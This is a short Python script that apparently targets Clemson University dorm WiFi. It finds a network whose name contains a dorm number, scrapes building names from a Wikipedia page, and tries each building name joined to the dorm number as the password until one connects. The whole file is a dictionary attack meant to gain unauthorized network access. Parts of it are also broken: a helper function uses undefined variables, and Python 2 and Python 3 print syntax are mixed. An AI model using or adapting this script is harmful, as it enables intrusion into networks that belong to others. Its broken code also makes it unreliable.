import requests
import re
from wifi import Cell, Scheme
from subprocess import STDOUT, check_output

INTERFACE = 'wlp3s0'

def connectWifi(ssid, password):
	output = check_output(cmd, stderr=STDOUT, timeout=seconds)
def genPass(dormNumber, ssid=None):
	res = requests.get('https://en.wikipedia.org/wiki/Campus_of_Clemson_University')
	for network in Cell.all(INTERFACE):
		if str(dormNumber) in str(network):
			ssid = network
	if ssid == None:
		raise Exception("SSID NOT FOUND")
	for name in re.findall('<tr valign="top">\n<td>(\w+)', str(res.text.encode('ascii', 'ignore').decode('ascii'))):
		password = "{}{}".format(name, dormNumber).lower()
		try:
			print password
			scheme = Scheme.for_cell(INTERFACE, str(dormNumber), ssid, password)
			scheme.activate()
			print('Connected: {}\nPassword: {}'.format(ssid, password))
		except Exception as exp:
			print exp
			pass




if __name__ == "__main__":
	genPass('134')